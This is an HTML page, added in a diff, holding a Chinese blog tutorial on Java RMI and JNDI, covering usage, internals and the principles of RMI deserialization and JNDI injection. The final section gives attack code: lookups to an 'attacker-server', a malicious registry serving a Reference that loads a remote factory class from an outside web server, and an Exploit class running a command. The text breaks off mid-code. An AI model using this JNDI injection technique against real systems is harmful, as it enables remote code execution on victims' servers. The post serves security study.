@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="He1m4n6a的博客">
+    <meta name="keyword"  content="腾讯">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        JAVA RMI和JDNI简介 - He1m4n6a的博客 | He1m4n6a&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 路漫漫其修远兮，吾将上下而求索。 </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>He1m4n6a</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archive">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#什么是RMI和JNDI"><span class="toc-text">什么是RMI和JNDI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RMI-的使用"><span class="toc-text">RMI 的使用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RMI-的原理"><span class="toc-text">RMI 的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#调用过程"><span class="toc-text">调用过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取Stub"><span class="toc-text">获取Stub</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#动态加载类"><span class="toc-text">动态加载类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Weblogic-RMI"><span class="toc-text">Weblogic RMI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RMI的攻击一般流程"><span class="toc-text">RMI的攻击一般流程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RMI小结"><span class="toc-text">RMI小结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI的使用"><span class="toc-text">JNDI的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI与LDAP配合使用"><span class="toc-text">JNDI与LDAP配合使用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI动态协议转换"><span class="toc-text">JNDI动态协议转换</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI漏洞原理"><span class="toc-text">JNDI漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用JNDI-References进行注入"><span class="toc-text">利用JNDI References进行注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击向量"><span class="toc-text">攻击向量</span></a></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 路漫漫其修远兮，吾将上下而求索。 </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        JAVA RMI和JDNI简介
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2019-03-16 22:43:50</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#JDNI" title="JDNI">JDNI</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#RMI" title="RMI">RMI</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#反序列化" title="反序列化">反序列化</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h1 id="什么是RMI和JNDI"><a href="#什么是RMI和JNDI" class="headerlink" title="什么是RMI和JNDI"></a>什么是RMI和JNDI</h1><p>Java RMI（Java Remote Method Invocation），即Java远程方法调用。是Java编程语言里，一种用于实现远程过程调用的应用程序<strong>编程接口</strong>。RMI 使用 <strong>JRMP（Java Remote Message Protocol，Java远程消息交换协议</strong>）实现，使得客户端运行的程序可以调用远程服务器上的对象。是实现RPC的一种方式。</p>
+<p>Java Naming and Directory Interface (JDNI)名为 Java命名和目录接口，，简单来说就是 JNDI 提供了<strong>一组通用的接口</strong>可供应用很方便地去访问不同的后端服务，例如 LDAP、RMI、CORBA 等。</p>
+<p>JNDA和RMI的关系可以粗浅的理解为url和http的关系：</p>
+<ul>
+<li><p>JNDI：类比url，提供访问的地址</p>
+</li>
+<li><p>RMI：类比http，是url中使用的协议。</p>
+</li>
+</ul>
+<h1 id="RMI-的使用"><a href="#RMI-的使用" class="headerlink" title="RMI 的使用"></a>RMI 的使用</h1><p>1、server端：创建远程对象，并注册远程对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义远程对象的接口</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HelloService</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    <span class="function">String <span class="title">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"><span class="comment">//接口的实现</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServiceImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">HelloService</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">super</span>();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Override</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">return</span> <span class="string">"Hello"</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"><span class="comment">//注册远程对象</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Service</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException, MalformedURLException </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">        HelloServiceImpl helloService = <span class="keyword">new</span> HelloServiceImpl();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">        Naming.bind(<span class="string">"rmi://127.0.0.1/hello"</span>,helloService);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+
+<p>2、client端：查找远程对象，调用远程方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException, MalformedURLException </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        HelloService helloService = (HelloService) Naming.lookup(<span class="string">"rmi://127.0.0.1/hello"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        System.out.println(helloService.say());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+
+<h1 id="RMI-的原理"><a href="#RMI-的原理" class="headerlink" title="RMI 的原理"></a>RMI 的原理</h1><p>RMI本质是TCP网络通信，内部封装了序列化和通信过程，使用代理实现接口调用。</p>
+<p><strong>几个重要知识点：</strong></p>
+<ol>
+<li>RMI的传输是基于反序列化的。</li>
+<li>对于任何一个以对象为参数的RMI接口，你都可以发一个自己构建的对象，迫使服务器端将这个对象按任何一个存在于服务端classpath（不在classpath的情况，可以看后面RMI动态加载类相关部分）中的可序列化类来反序列化恢复对象。</li>
+</ol>
+<h3 id="调用过程"><a href="#调用过程" class="headerlink" title="调用过程"></a>调用过程</h3><p><img src="/images/a10/1.png" alt="image-20200216203005799"></p>
+<ol>
+<li>Server端监听一个端口，这个端口是JVM随机选择的；</li>
+<li>Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作；</li>
+<li>Client端可以调用Stub上的方法；</li>
+<li>Stub连接到Server端监听的通信端口并提交参数；</li>
+<li>远程Server端上执行具体的方法，并返回结果给Stub；</li>
+<li>Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样；</li>
+</ol>
+<h3 id="获取Stub"><a href="#获取Stub" class="headerlink" title="获取Stub"></a>获取Stub</h3><p>假设Stub可以通过调用某个远程服务上的方法向远程服务来获取，但是调用远程方法又必须先有远程对象的Stub，所以这里有个死循环问题。JDK提供了一个RMI注册表（RMIRegistry）来解决这个问题。RMIRegistry也是一个远程对象，默认监听在传说中的<strong>1099端口</strong>上，可以使用代码启动RMIRegistry，也可以使用rmiregistry命令。</p>
+<p><img src="/images/a10/2.png" alt="img"></p>
+<p>所以从客户端角度看，服务端应用是有两个端口的，<strong>一个是RMI Registry端口（默认为1099），另一个是远程对象的通信端口（随机分配的）</strong>，通常我们只需要知道Registry的端口就行了，Server的端口包含在了Stub中。RMI Registry可以和Server端在一台服务器上，也可以在另一台服务器上，不过大多数时候在同一台服务器上且运行在同一JVM环境下。</p>
+<h1 id="动态加载类"><a href="#动态加载类" class="headerlink" title="动态加载类"></a>动态加载类</h1><p>RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。</p>
+<p><img src="/images/a10/3.png" alt="动态加载类"></p>
+<h1 id="Weblogic-RMI"><a href="#Weblogic-RMI" class="headerlink" title="Weblogic RMI"></a>Weblogic RMI</h1><p>T3传输协议是WebLogic的自有协议，Weblogic RMI就是通过T3协议传输的（可以理解为序列化的数据载体是T3），它有如下特点：</p>
+<ol>
+<li>服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。</li>
+<li>通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。</li>
+</ol>
+<p>上面说了JAVA RMI是使用JRMP的协议进行传输，<strong>协议的不同就是他们最大的差别。</strong></p>
+<h1 id="RMI的攻击一般流程"><a href="#RMI的攻击一般流程" class="headerlink" title="RMI的攻击一般流程"></a>RMI的攻击一般流程</h1><ol>
+<li>服务端打开了RMI Registry端口（默认1099）</li>
+<li>创建恶意客户端代码，连接RMI Registry，获取远程恶意对象，并调用恶意对象，执行恶意操作</li>
+</ol>
+<p>备注：</p>
+<ul>
+<li>执行的恶意操作是在服务端执行的，因为RMI就是为了在客户端一样方便的执行远程服务端。并且如果执行的是客户端的恶意操作，那本就不是漏洞</li>
+<li>远程恶意对象，是服务器刚好存在，并且我们知道。</li>
+<li>通常RMI Registry和服务端在同一服务器且处于同一JVM下，所以可以利用服务器的组件CommonsCollections来构造gadget，构造方法就是前面文章介绍的反序列gadget构造方法。</li>
+</ul>
+<h1 id="RMI小结"><a href="#RMI小结" class="headerlink" title="RMI小结"></a>RMI小结</h1><ol>
+<li>RMI标准实现是Java RMI，其他实现还有Weblogic RMI、Spring RMI等。</li>
+<li>RMI的调用是基于序列化的，<strong>一个对象远程传输需要序列化</strong>，需要使用到这个对象就需要从序列化的数据中恢复这个对象，恢复这个对象时对应的readObject、readExternal等方法会被自动调用。</li>
+<li>RMI可以利用服务器本地反序列化利用链进行攻击。</li>
+<li>RMI具有动态加载类的能力以及能利用这种能力进行恶意利用。这种利用方式是在本地不存在可用的利用链或者可用的利用链中某些类被过滤了导致无法利用时可以使用，不过利用条件有些苛刻。</li>
+<li>讲了Weblogic RMI和Java RMI的区别，以及Java RMI默认使用的专有传输协议（或者也可以叫做默认协议）是JRMP，Weblogic RMI默认使用的传输协议是T3。</li>
+<li>Weblogic RMI正常调用触发反序列化以及模拟T3协议触发反序列化都可以，但是模拟T3协议传输简化了很多过程。</li>
+</ol>
+<h1 id="JNDI的使用"><a href="#JNDI的使用" class="headerlink" title="JNDI的使用"></a>JNDI的使用</h1><p>JNDI自身并不区分客户端和服务器端，也不具备远程能力，但是被其协同的一些其他应用一般都具备远程能力，JNDI在客户端和服务器端都能够进行一些工作，客户端上主要是进行各种访问，查询，搜索，而服务器端主要进行的是帮助管理配置。</p>
+<p>前面说了JNDI类似于url，rmi类似于http，所以JNDI还可以使用除rmi之外的协议，例如LDAP、CORBA等。</p>
+<p>##JNDI与RMI配合使用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Hashtable env = <span class="keyword">new</span> Hashtable();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">env.put(Context.PROVIDER_URL,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">        <span class="string">"rmi://localhost:9999"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">Context ctx = <span class="keyword">new</span> InitialContext(env);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"><span class="comment">//将名称refObj与一个对象绑定，这里底层也是调用的rmi的registry去绑定</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">ctx.bind(<span class="string">"refObj"</span>, <span class="keyword">new</span> RefObject());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过名称查找对象</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">ctx.lookup(<span class="string">"refObj"</span>);</span></pre></td></tr></table></figure>
+
+<h2 id="JNDI与LDAP配合使用"><a href="#JNDI与LDAP配合使用" class="headerlink" title="JNDI与LDAP配合使用"></a>JNDI与LDAP配合使用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Hashtable env = <span class="keyword">new</span> Hashtable();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"> <span class="string">"com.sun.jndi.ldap.LdapCtxFactory"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">env.put(Context.PROVIDER_URL, <span class="string">"ldap://localhost:1389"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">DirContext ctx = <span class="keyword">new</span> InitialDirContext(env);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过名称查找远程对象，假设远程服务器已经将一个远程对象与名称cn=foo,dc=test,dc=org绑定了</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">Object local_obj = ctx.lookup(<span class="string">"cn=foo,dc=test,dc=org"</span>);</span></pre></td></tr></table></figure>
+
+<h1 id="JNDI动态协议转换"><a href="#JNDI动态协议转换" class="headerlink" title="JNDI动态协议转换"></a>JNDI动态协议转换</h1><p>上面的两个例子都手动设置了对应服务的工厂以及对应服务的PROVIDER_URL，但是JNDI是能够进行动态协议转换的。</p>
+<p>例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Context ctx = <span class="keyword">new</span> InitialContext();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">ctx.lookup(<span class="string">"rmi://attacker-server/refObj"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="comment">//ctx.lookup("ldap://attacker-server/cn=bar,dc=test,dc=org");</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="comment">//ctx.lookup("iiop://attacker-server/bar");</span></span></pre></td></tr></table></figure>
+
+<p>上面没有设置对应服务的工厂以及PROVIDER_URL，JNDI根据<strong>传递的URL协议</strong>自动转换与设置了对应的工厂与PROVIDER_URL（即使服务端提前设置了工厂与PROVIDER_URL）。</p>
+<p>在使用lookup方法时，会进入getURLOrDefaultInitCtx这个方法，转换就在这里面：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Context <span class="title">getURLOrDefaultInitCtx</span><span class="params">(String name)</span> </span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">throws</span> NamingException </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (NamingManager.hasInitialContextFactoryBuilder()) &#123;<span class="comment">//这里不是说我们设置了上下文环境变量就会进入，因为我们没有执行初始化上下文工厂的构建，所以上面那两种情况在这里都不会进入</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">return</span> getDefaultInitCtx();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">String scheme = getURLScheme(name);<span class="comment">//尝试从名称解析URL中的协议</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (scheme != <span class="keyword">null</span>) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    Context ctx = NamingManager.getURLContext(scheme, myProps);<span class="comment">//如果解析出了Schema协议，则尝试获取其对应的上下文环境</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (ctx != <span class="keyword">null</span>) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">   <span class="keyword">return</span> ctx;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> getDefaultInitCtx();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">   &#125;</span></pre></td></tr></table></figure>
+
+<h1 id="JNDI漏洞原理"><a href="#JNDI漏洞原理" class="headerlink" title="JNDI漏洞原理"></a>JNDI漏洞原理</h1><p>JNDI接口在初始化时，可以将RMI URL作为参数传入，而JNDI注入就出现在客户端的lookup()函数中，如果lookup()的参数可控就可能被攻击。</p>
+<p>备注：</p>
+<ul>
+<li>InitialContext 是一个实现了 Context接口的类。使用这个类作为JNDI命名服务的入口点。创建InitialContext 对象需要传入一组属性，参数类型为java.util.Hashtable或其子类之一。</li>
+<li>需要重点注意的是，JNDI注入恶意的RMI服务器是攻击者在本地可控，<strong>被攻击的服务器看成是发起lookup请求的客户端。</strong></li>
+</ul>
+<p>上一章节讲了RMI的漏洞利用，恶意代码是在RMI服务端执行的。所以为什么目标服务器lookup(RMI客户端)一个恶意的RMI服务地址，恶意代码会在目标服务器（RMI客户端）执行呢？</p>
+<h2 id="利用JNDI-References进行注入"><a href="#利用JNDI-References进行注入" class="headerlink" title="利用JNDI References进行注入"></a>利用JNDI References进行注入</h2><p>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以<strong>通过References类来绑定一个外部的远程对象</strong>（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p>
+<p>使用工厂的话，因为为了构造对象，需要先从远程获取工厂类，<strong>并在目标系统中工厂类被加载</strong>。</p>
+<p><strong>整个利用流程如下：</strong></p>
+<ol>
+<li>目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；</li>
+<li>攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name；</li>
+<li>攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；</li>
+<li>目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例。</li>
+</ol>
+<h2 id="攻击向量"><a href="#攻击向量" class="headerlink" title="攻击向量"></a>攻击向量</h2><p>攻击者的服务端需要启动一个RMI Registry，并且绑定一个Reference远程对象，同时设置一个恶意的factory类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">String remote_class_server = <span class="string">"http://192.168.1.200:8080/"</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">Reference reference = <span class="keyword">new</span> Reference(<span class="string">"Exploit"</span>, <span class="string">"Exploit"</span>, remote_class_server);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="comment">//reference的factory class参数指向了一个外部Web服务的地址</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">registry.bind(<span class="string">"xxx"</span>, referenceWrapper);</span></pre></td></tr></table></figure>
+
+<p>同时启动一个WebServer提供Exploit.class下载。恶意代码可以放在构造方法中，也可以放在getObjectInstance(）方法中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        exec(<span class="string">"xterm"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td 